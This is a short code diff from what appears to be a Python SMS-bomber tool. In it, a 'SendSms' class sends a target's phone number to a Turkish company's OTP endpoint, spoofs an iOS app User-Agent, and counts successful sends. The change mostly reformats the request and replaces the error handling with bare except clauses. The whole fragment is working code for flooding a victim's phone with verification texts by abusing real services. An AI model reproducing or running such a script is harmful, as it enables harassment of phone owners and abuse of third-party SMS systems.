@@ -76,28 +76,17 @@ class SendSms():
 
     def File(self):
         try:
-            url = "https://api.filemarket.com.tr/v1/otp/send"
-            headers = {
-                "Accept": "*/*",
-                "Content-Type": "application/json",
-                "User-Agent":
-                "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
-                "X-Os": "IOS",
-                "X-Version": "1.7"
-            }
-            json = {"mobilePhoneNumber": f"90{self.phone}"}
+            url = "https://api.filemarket.com.tr:443/v1/otp/send"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
+            json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["responseType"] == "SUCCESS":
-                print(
-                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr"
-                )
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                 self.adet += 1
             else:
-                raise Exception("API Error")
-        except Exception as e:
-            print(
-                f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr"
-            )
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
 
     def Metro(self):
         try:
